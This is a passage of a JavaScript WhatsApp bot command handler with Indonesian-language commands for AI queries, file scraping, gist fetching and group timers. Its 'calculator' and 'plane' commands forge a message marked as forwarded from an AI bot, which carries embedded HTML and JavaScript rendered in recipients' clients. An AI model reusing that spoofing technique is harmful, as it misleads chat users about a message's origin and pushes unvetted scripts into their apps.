${res.data.character.list.length >= 2 ? `\n*⎣⧉⎤ Karakter lain yang terdeteksi*\n${res.data.character.list.map((it) => `> *Nama:* ${it.label}\n> *Persentase:* ${fixed(it.confidence || 0)}%`).join('\n\n')}\n` : ''}
*⎣⧉⎤ Prompt*
${res.data.prompt}

*⎣⧉⎤ Rating*
${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}

*⎣⧉⎤ Tag*
${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
`.trim()
      xreply(teks)
    } catch (e) {
      console.error(e)
      xreply(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖬𝖾𝗂𝗀𝖾𝗇 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
  case 'meigen':
  case 'meigensearch': {
    if (!text) {
      return xreply(`Contoh:\n${prefix + command} anime girl`);
    }

    try {
      const res = await fetch(`https://www.meigen.ai/api/search?q=${encodeURIComponent(text)}`);

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}`);
      }

      const json = await res.json();

      if (!json?.success || !Array.isArray(json.data) || json.data.length < 1) {
        return xreply('❌ Prompt tidak ditemukan.');
      }

      const data = json.data[Math.floor(Math.random() * json.data.length)];

      const caption = `*🌸 MEIGEN SEARCH*

*Query:* ${text}

*Author:* ${data.author_display_name || '-'}
*Username:* @${data.author_username || '-'}
*Model:* ${data.model || '-'}

*📊 Statistik*
• Likes: ${data.likes || 0}
• Views: ${data.views || 0}
• Favorites: ${data.favorites_count || 0}

*📝 Prompt:*
${(data.text || 'Tidak ada prompt').length > 1500
          ? data.text.slice(0, 1500) + '...'
          : data.text || 'Tidak ada prompt'}`;

      if (data.thumbnail_url) {
        await client.sendMessage(
          m.chat,
          {
            image: { url: data.thumbnail_url },
            caption
          },
          { quoted: m }
        );
      } else {
        await xreply(caption);
      }

    } catch (e) {
      console.error(e);
      xreply(`❌ Error: ${e.message}`);
    }
  }
  break;

  /// ───────────── [ 𝖬𝖾𝗍𝖺 𝖠𝖨 ] ──────────── ///
  case "metaai": {
    if (!text) return xreply("*Contoh:* .metaai Apa itu JavaScript?");
    Reply(mess.wait);
    try {
      const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
      const response = await axios.get(apiUrl);
      const data = response.data;

      if (data.status && data.data) {
        await xreply(`*Meta AI*\n\n${data.data}`);
      } else {
        Reply("❌ Gagal mendapatkan respons dari Meta AI");
      }
    } catch (error) {
      console.error("Meta AI Error:", error);
      Reply(mess.error);
    }
  }
  break

  /// ───────────── [ 𝖲𝗈𝗈𝗇𝖾𝗑 𝖠𝖨 ] ──────────── ///
  case 'soonex': {
    if (!text) {
      return xreply(`Contoh:\n.soonex halo`)
    }

    try {
      const fetch = require('node-fetch')

      await client.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })

      let res = await fetch(
        `https://api.soonex.biz.id/v1/ai/soonex?text=${encodeURIComponent(text)}`
      )

      let data = await res.json()

      console.log(data)

      let hasil =
        data.result ||
        data.answer ||
        data.message ||
        'Tidak ada respon dari AI'

      await client.sendMessage(
        m.chat,
        {
          text: hasil
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)

      xreply('❌ Terjadi kesalahan saat mengambil respon AI')
    }
  }
  break

  /// ───────────── [ 𝖢𝖾𝗄 𝖨𝖽 𝖦𝗋𝗎𝗉 ] ──────────── ///
  case "idgc":
  case "cekidgc": {
    if (!m.isGroup) return reply(mess.group)
    xreply(m.chat)
  }
  break

  /// ───────────── [ 𝖯𝗂𝗅𝗈𝗍 (𝖤𝗉𝗌𝗂𝗅𝗈𝗇 𝖠𝖨) ] ──────────── ///
  case 'pilot': {
    try {
      if (!text) {
        return xreply(`*Contoh*\n${prefix + command} keadilan`);
      }

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      const params = new URLSearchParams({
        originalQuery: text,
        transformedQuery: text,
        filter: JSON.stringify({
          publishedYearMin: 2000,
          publishedYearMax: 2024,
          citationMin: 0,
          journalFilter: 'ALL'
        }),
        threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
        numPapers: 15,
        existingCorpusIds: JSON.stringify([]),
        forceUseEpsilonDb: false
      });

      const res = await fetch(
        `https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`,
        {
          headers: {
            Accept: 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0'
          }
        }
      );

      if (!res.ok) {
        throw new Error('Gagal mengambil data dari Epsilon AI');
      }

      const data = await res.json();

      if (!data.papers || !data.papers.length) {
        return xreply('🍂 *Tidak ditemukan insight yang relevan.*');
      }

      const papers = data.papers.slice(0, 5);

      let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
      output += `🔎 *Topik:* ${text}\n`;
      output += `📄 *Total Paper:* ${data.papers.length}\n`;
      output += `⚡ *Ditampilkan:* Insight cepat (Top 5)\n\n`;

      for (let i = 0; i < papers.length; i++) {
        const p = papers[i];
        const insight = p.abstract
          ? p.abstract.split('. ').slice(0, 2).join('. ') + '.'
          : 'Insight ringkas tidak tersedia.';

        output += `📌 *${i + 1}. ${p.title || 'Tanpa Judul'}*\n`;
        output += `📅 *Year:* ${p.year || '-'}\n`;
        output += `💡 *Insight:* ${insight}\n`;
        output += `🔗 ${p.url || '-'}\n\n`;
      }

      await xreply(output.trim());
    } catch (e) {
      await xreply(`🍂 *Terjadi kesalahan*\n\n${e.message}`);
    } finally {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
  };
  break

  case "pilot2": {
    try {
      if (!text) {
        return xreply(`*Contoh*\n${prefix + command} keadilan`);
      }

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      const params = new URLSearchParams({
        originalQuery: text,
        transformedQuery: text,
        filter: JSON.stringify({
          publishedYearMin: 2000,
          publishedYearMax: 2024,
          citationMin: 0,
          journalFilter: 'ALL'
        }),
        threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
        numPapers: 15,
        existingCorpusIds: JSON.stringify([]),
        forceUseEpsilonDb: false
      });

      const res = await fetch(
        `https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`,
        {
          headers: {
            Accept: 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0'
          }
        }
      );

      if (!res.ok) {
        throw new Error('Gagal mengambil data dari Epsilon AI');
      }

      const data = await res.json();

      if (!data.papers || !data.papers.length) {
        return xreply('🍂 *Tidak ditemukan insight yang relevan.*');
      }

      const papers = data.papers.slice(0, 5);

      let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
      output += `🔎 *Topik:* ${text}\n`;
      output += `📄 *Total Paper:* ${data.papers.length}\n`;
      output += `⚡ *Ditampilkan:* Insight cepat (Top 5)\n\n`;

      for (let i = 0; i < papers.length; i++) {
        const p = papers[i];
        const insight = p.abstract
          ? p.abstract.split('. ').slice(0, 2).join('. ') + '.'
          : 'Insight ringkas tidak tersedia.';

        output += `📌 *${i + 1}. ${p.title || 'Tanpa Judul'}*\n`;
        output += `📅 *Year:* ${p.year || '-'}\n`;
        output += `💡 *Insight:* ${insight}\n`;
        output += `🔗 ${p.url || '-'}\n\n`;
      }

      await xreply(output.trim());
    } catch (e) {
      await xreply(`🍂 *Terjadi kesalahan*\n\n${e.message}`);
    } finally {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
  };
  break

  /// ───────────── [ 𝖮𝗉𝖾𝗇/𝖢𝗅𝗈𝗌𝖾 𝖳𝗂𝗆𝖾 ] ──────────── ///
  case 'opentime': {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!args[0] || isNaN(args[0])) return xreply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')

    const timeUnits = {
      'detik': 1000,
      'menit': 60000,
      'jam': 3600000,
      'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return xreply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    xreply(`Open time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
      try {
        client.groupSettingUpdate(m.chat, 'not_announcement')
        xreply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
      } catch (err) {
        xreply('Terjadi kesalahan saat membuka grup')
        console.log(err)
      }
    }, timer)
  }
  break

  case 'closetime': {
    if (!isOwner && !isPremium) return reply(mess.owner)
    if (!args[0] || isNaN(args[0])) return xreply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')

    const timeUnits = {
      'detik': 1000,
      'menit': 60000,
      'jam': 3600000,
      'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return xreply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    xreply(`Close time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
      try {
        client.groupSettingUpdate(m.chat, 'announcement')
        xreply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
      } catch (err) {
        xreply('Terjadi kesalahan saat menutup grup')
        console.log(err)
      }
    }, timer)
  }
  break

  /// ───────────── [ 𝖲𝗄𝗂𝗉 𝖦𝗂𝗍𝗌 𝖢𝗈𝖽𝖾 ] ──────────── ///
  case "skipcode": {
    try {
      let [link, type] = text.split(" ");
      if (!link.includes("github")) return xreply(`⚠️ Masukan Link Gits Code!
 \`--doc\` kirim pesan code pake document`);

      const id = (link.match(/gist\.github\.com\/(?:[^\/]+\/)?([a-zA-Z0-9]+)/) || [])[1] || link.split('/').pop().split('#')[0]
      const getRaw = await (await axios.get(`https://api.github.com/gists/${id}`)).data;
      const files = Object.values(getRaw?.files || []);

      for (let i = 0; files.length > 0 && i < files.length; i++) {
        const file = files[i]

        if (type?.endsWith("--doc")) {
          const buffer = Buffer.from(file.content, "utf-8")

          await client.sendMessage(m.chat, {
            document: buffer,
            fileName: file.filename,
            mimetype: file.type
          }, {
            quoted: m
          })
        } else {
          await xreply(file.content)
        };
      };

    } catch (e) {
      xreply("❌ Gomene Error Mungkin lu kebanyakan request");
      console.error(e);
    };
  };
  break

  /// ───────────── [ 𝖲𝗍𝖺𝗍𝗎𝗌 & 𝖢𝖾𝗄 𝖦𝗋𝗎𝗉 ] ──────────── ///
  case 'totalchat':
  case 'statgroup': {
    if (!m.isGroup) return xreply('Fitur ini hanya bisa digunakan di grup.');
    const stats = getTodayStats(m.chat)
    if (Object.keys(stats).length === 0) return xreply('Belum ada data chat hari ini.')
    let teks = `*Statistik Chat Hari Ini:*\n\n`
    const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
    let i = 1
    for (const [user, total] of sorted) {
      const name = client.getName ? await client.getName(user) : user.split('@')[0]
      teks += `${i++}. ${name} - ${total} chat\n`
    }
    xreply(teks)
  }
  break

  /// ───────────── [ 𝖲𝖿𝗂𝗅𝖾 (𝖲𝖿𝗂𝗅𝖾.𝗆𝗈𝖻𝗂) ] ──────────── ///
  case 'sf':
  case 'sfile': {
    try {
      const axios = require("axios");
      const mime = require("mime-types");
      const cheerio = require("cheerio");

      const sfile = {
        createHeaders: referer => ({
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
          'dnt': '1',
          'sec-ch-ua-mobile': '?1',
          'sec-ch-ua-platform': '"Android"',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'Referer': referer,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9'
        }),

        extractCookies: h => h['set-cookie']?.map(c => c.split(';')[0]).join('; ') || '',

        extractMetadata: $ => {
          const m = {}
          $('.file-content').eq(0).each((_, e) => {
            const x = $(e)
            m.file_name = x.find('img').attr('alt')
            m.mimetype = x.find('.list').eq(0).text().trim().split('-')[1].trim()
            m.upload_date = x.find('.list').eq(2).text().trim().split(':')[1].trim()
            m.download_count = x.find('.list').eq(3).text().trim().split(':')[1].trim()
            m.author_name = x.find('.list').eq(1).find('a').text().trim()
          })
          return m
        },

        makeRequest: async (u, o) => {
          try { return await axios.get(u, o) }
          catch (e) { if (e.response) return e.response; throw new Error(`Request gagal: ${e.message}`) }
        },

        download: async (url, resultBuffer = false) => {
          try {
            let h = sfile.createHeaders(url)
            const init = await sfile.makeRequest(url, { headers: h })
            const ck = sfile.extractCookies(init.headers)
            h.Cookie = ck
            let $ = cheerio.load(init.data)
            const meta = sfile.extractMetadata($)
            const dl = $('#download').attr('href')
            if (!dl) throw new Error('Download URL gak ketemu')
            h.Referer = dl
            const proc = await sfile.makeRequest(dl, { headers: h })
            const html = proc.data
            $ = cheerio.load(html)
            const scr = $('script').map((i, el) => $(el).html()).get().join('\n')
            const re = /https:\\\/\\\/download\d+\.sfile\.mobi\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi
            const mt = scr.match(re)
            if (!mt?.length) throw new Error('Link download final gak ketemu di script')
            const fin = mt[0].replace(/\\\//g, '/')
            let download
            if (resultBuffer) {
              const file = await sfile.makeRequest(fin, { headers: h, responseType: 'arraybuffer' })
              download = Buffer.from(file.data)
            } else download = fin
            return { metadata: meta, download }
          } catch (e) { throw new Error(`${e.message}`) }
        }
      }
      if (!args[0]) return xreply('*Example :* .sfile https://sfile.mobi/2E5O1HMVKcc')
      let data = await sfile.download(args[0], true)
      let { file_name, mimetype, upload_date, download_count, author_name } = data.metadata
      let type = mime.lookup(file_name) || 'application/octet-stream'
      await client.sendMessage(m.chat, { document: data.download, fileName: file_name, mimetype: type }, { quoted: m })
    } catch (e) { xreply(e.message) }
  }
  break

  /// ───────────── [ 𝖦𝖺𝗆𝖾 𝖱𝗂𝖼𝗁 (𝖨𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗏𝖾 𝖧𝖳𝖬𝖫) ] ──────────── ///
  case "calculator":
  case "kalkulator": {
    const html = String.raw`
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@700;900&display=swap');

    * {
        -webkit-tap-highlight-color: transparent;
        -webkit-user-select: none;
        user-select: none;
        box-sizing: border-box;
    }
</style>

<body
    style="
        margin: 0;
        background: #0A0A0F;
        font-family: 'Roboto', Arial, sans-serif;
        color: #fff;
        touch-action: manipulation;
    "
>
    <div
        style="
            width: 100%;
            max-width: 420px;
            margin: auto;
            padding: 16px;
        "
    >
        <div
            style="
                background: linear-gradient(180deg, #111118 0%, #0A0A0F 100%);
                border: 2px solid #2A2A35;
                border-radius: 18px;
                padding: 20px;
                box-shadow: 0 0 25px rgba(0, 140, 255, .12);
            "
        >
            <div
                style="
                    font-size: 11px;
                    letter-spacing: 2px;
                    color: #00A2FF;
                    margin-bottom: 8px;
                    font-weight: 900;
                "
            >
                client CALCULATOR
            </div>

            <div
                id="display"
                style="
                    background: #16161F;
                    border: 2px solid #2E2E3A;
                    border-radius: 12px;
                    padding: 18px;
                    margin-bottom: 16px;
                    text-align: right;
                    font-size: 32px;
                    font-weight: 900;
                    min-height: 60px;
                    word-wrap: break-word;
                    box-shadow: inset 0 0 15px rgba(0, 0, 0, .4);
                "
            >
                0
            </div>

            <div
                id="sub"
                style="
                    text-align: right;
                    font-size: 14px;
                    color: #8A8A9E;
                    margin-top: -12px;
                    margin-bottom: 16px;
                    height: 18px;
                "
            >
                
            </div>

            <div
                style="
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 10px;
                "
            >
                <button class="btn op" data-v="C">C</button>
                <button class="btn op" data-v="DEL">⌫</button>
                <button class="btn op" data-v="%">%</button>
                <button class="btn op" data-v="/">÷</button>

                <button class="btn num" data-v="7">7</button>
                <button class="btn num" data-v="8">8</button>
                <button class="btn num" data-v="9">9</button>
                <button class="btn op" data-v="*">×</button>

                <button class="btn num" data-v="4">4</button>
                <button class="btn num" data-v="5">5</button>
                <button class="btn num" data-v="6">6</button>
                <button class="btn op" data-v="-">−</button>

                <button class="btn num" data-v="1">1</button>
                <button class="btn num" data-v="2">2</button>
                <button class="btn num" data-v="3">3</button>
                <button class="btn op" data-v="+">+</button>

                <button
                    class="btn num"
                    data-v="0"
                    style="grid-column: span 2"
                >
                    0
                </button>

                <button class="btn num" data-v=".">.</button>
                <button class="btn eq" data-v="=">=</button>
            </div>
        </div>
    </div>

    <style>
        .btn {
            border: none;
            border-radius: 10px;
            padding: 16px;
            font-size: 20px;
            font-weight: 900;
            cursor: pointer;
            transition: .15s;
            background: #1F1F29;
            color: #fff;
            border: 1px solid #2E2E3A;
        }

        .btn:active {
            transform: scale(.92);
        }

        .num:hover {
            background: #25252F;
        }

        .op {
            background: #23232E;
            color: #00A2FF;
        }

        .op:hover {
            background: #2A2A35;
            box-shadow: 0 0 10px rgba(0, 162, 255, .3);
        }

        .eq {
            background: linear-gradient(135deg, #00A2FF, #0080FF);
            color: #fff;
            box-shadow: 0 0 15px rgba(0, 162, 255, .4);
        }

        .eq:hover {
            filter: brightness(1.15);
        }
    </style>

    <script>
        let expr = '',
            display = document.getElementById('display'),
            sub = document.getElementById('sub');

        function update() {
            display.textContent = expr || '0';
        }

        function calculateExpression(input) {
            let index = 0;

            input = input
                .replace(/×/g, '*')
                .replace(/÷/g, '/')
                .replace(/−/g, '-')
                .replace(/\s+/g, '');

            function parseExpression() {
                let value = parseTerm();

                while (index < input.length) {
                    let op = input[index];

                    if (op !== '+' && op !== '-') {
                        break;
                    }

                    index++;

                    let right = parseTerm();

                    if (op === '+') {
                        value += right;
                    } else {
                        value -= right;
                    }
                }

                return value;
            }

            function parseTerm() {
                let value = parseFactor();

                while (index < input.length) {
                    let op = input[index];

                    if (
                        op !== '*' &&
                        op !== '/' &&
                        op !== '%'
                    ) {
                        break;
                    }

                    index++;

                    let right = parseFactor();

                    if (op === '*') {
                        value *= right;
                    } else if (op === '/') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value /= right;
                    } else if (op === '%') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value %= right;
                    }
                }

                return value;
            }

            function parseFactor() {
                if (input[index] === '+') {
                    index++;
                    return parseFactor();
                }

                if (input[index] === '-') {
                    index++;
                    return -parseFactor();
                }

                if (input[index] === '(') {
                    index++;

                    let value = parseExpression();

                    if (input[index] !== ')') {
                        throw new Error('Invalid expression');
                    }

                    index++;

                    return value;
                }

                let start = index;
                let hasDot = false;

                while (index < input.length) {
                    let char = input[index];

                    if (char >= '0' && char <= '9') {
                        index++;
                        continue;
                    }

                    if (char === '.') {
                        if (hasDot) {
                            throw new Error('Invalid number');
                        }

                        hasDot = true;
                        index++;
                        continue;
                    }

                    break;
                }

                if (start === index) {
                    throw new Error('Invalid expression');
                }

                let number = Number(input.slice(start, index));

                if (!isFinite(number)) {
                    throw new Error('Invalid number');
                }

                return number;
            }

            let result = parseExpression();

            if (index !== input.length) {
                throw new Error('Invalid expression');
            }

            if (!isFinite(result)) {
                throw new Error('Invalid result');
            }

            return result;
        }

        function calc() {
            try {
                let res = calculateExpression(expr);

                sub.textContent = expr + ' =';
                expr = String(res);
            } catch (e) {
                expr = 'Error';

                setTimeout(() => {
                    expr = '';
                    update();
                }, 1200);
            }

            update();
        }

        document.querySelectorAll('.btn').forEach(b => {
            b.onclick = () => {
                let v = b.dataset.v;

                if (v === 'C') {
                    expr = '';
                    sub.textContent = ' ';
                }

                else if (v === 'DEL') {
                    expr = expr.slice(0, -1);
                }

                else if (v === '=') {
                    calc();
                    return;
                }

                else {
                    expr += v;
                }

                update();
            }
        });
    </script>
</body>
    `;

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",

      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",

          view_model: {
            __typename: "GenAISingleLayoutViewModel",

            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],

      embedded_screens: [
        {
          title: "Preview",

          content: [
            {
              __typename: "FOAIDNixelButtonSheets",

              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",

                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",

                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",

                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: [
                            "example.com"
                          ]
                        }
                      }
                    }
                  ],

                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,

          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },

        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,

              unifiedResponse: {
                data: Buffer
                  .from(JSON.stringify(data))
                  .toString('base64')
              },

              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,

                forwardedAiBotMessageInfo: {
                  botJid: "0@bot"
                },

                forwardOrigin: 4
              }
            }
          }
        }
      },

      {
        messageId: await client.generateMessageTag()
      }
    );
  }
  break

  case "pesawat":
  case "plane": {
    const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #3b82f6; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(59,130,246,0.1); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #60a5fa; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #60a5fa; text-shadow: 0 0 12px rgba(96,165,250,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #070a12; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #60a5fa; text-shadow: 0 0 10px rgba(96,165,250,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>MISTER-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Space Rush 🚀</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>
    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Kills</div><div class="val" id="killsStat">0</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Coins</div><div class="val" id="coinsStat">0</div></div>
    </div>
    <div id="game-container">
      <canvas id="c"></canvas>
    </div>
    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>
    <div class="credit-bar">
      Engineered by <span>MISTER-MD • 2026</span> ⚡
    </div>
  </div>
</div>
<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var killsStatEl = document.getElementById('killsStat');
  var comboStatEl = document.getElementById('comboStat');
  var coinsStatEl = document.getElementById('coinsStat');
  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;
  var ROAD_L = 20, ROAD_R = W - 20;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));
  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 65;
  var score = 0;
  var best = 0;
  var kills = 0;
  var coinCount = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;
  try { best = parseInt(localStorage.getItem('plane_best_v1') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
  var bullets = [];
  var enemies = [];
  var coins = [];
  var particles = [];
  var stars = [];
  var gameOver = false;
  var shootTimer = 0;
  for (var s = 0; s < 40; s++) {
    stars.push({ x: Math.random() * W, y: Math.random() * H, size: Math.random() * 2 + 1, speed: Math.random() * 2 + 1 });
  }
  function spawnEnemy() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    var isMeteor = Math.random() < 0.45;
    enemies.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -40,
      w: isMeteor ? 34 : 28,
      h: isMeteor ? 34 : 32,
      hp: isMeteor ? 999 : 1,
      isMeteor: isMeteor,
      speed: isMeteor ? 2.2 + Math.random() * 1.5 : 1.8 + Math.random() * 1.2
    });
  }
  function explode(x, y, color, count) {
    count = count || 20;
    for (var i = 0; i < count; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 1 + Math.random() * 5;
      particles.push({
        x: x, y: y,
        vx: Math.cos(angle) * spd,
        vy: Math.sin(angle) * spd,
        color: color,
        life: 1,
        size: 2 + Math.random() * 3
      });
    }
  }
  function drawSpaceCraft(x, y) {
    ctx.save();
    ctx.translate(x, y);
    var flameH = 12 + Math.random() * 8;
    var gradFlame = ctx.createLinearGradient(0, 15, 0, 15 + flameH);
    gradFlame.addColorStop(0, '#38bdf8');
    gradFlame.addColorStop(0.5, '#f59e0b');
    gradFlame.addColorStop(1, 'transparent');
    ctx.fillStyle = gradFlame;
    ctx.fillRect(-10, 15, 5, flameH);
    ctx.fillRect(5, 15, 5, flameH);
    ctx.fillStyle = '#1e3a8a';
    ctx.beginPath();
    ctx.moveTo(-12, 10);
    ctx.lineTo(-20, 18);
    ctx.lineTo(-8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.beginPath();
    ctx.moveTo(12, 10);
    ctx.lineTo(20, 18);
    ctx.lineTo(8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.fillStyle = '#2563eb';
    ctx.beginPath();
    ctx.moveTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.lineTo(12, 14);
    ctx.lineTo(0, 8);
    ctx.lineTo(-12, 14);
    ctx.lineTo(-26, 12);
    ctx.closePath();
    ctx.fill();
    ctx.strokeStyle = '#60a5fa';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.moveTo(-26, 12);
    ctx.lineTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.stroke();
    ctx.fillStyle = '#0284c7';
    ctx.fillRect(-12, 2, 4, 12);
    ctx.fillRect(8, 2, 4, 12);
    ctx.fillStyle = '#ef4444';
    ctx.fillRect(-25, 5, 2, 8);
    ctx.fillRect(23, 5, 2, 8);
    var gradBody = ctx.createLinearGradient(0, -28, 0, 16);
    gradBody.addColorStop(0, '#e0f2fe');
    gradBody.addColorStop(0.4, '#38bdf8');
    gradBody.addColorStop(1, '#1e40af');
    ctx.fillStyle = gradBody;
    ctx.beginPath();
    ctx.moveTo(0, -28);
    ctx.lineTo(7, -8);
    ctx.lineTo(6, 16);
    ctx.lineTo(-6, 16);
    ctx.lineTo(-7, -8);
    ctx.closePath();
    ctx.fill();
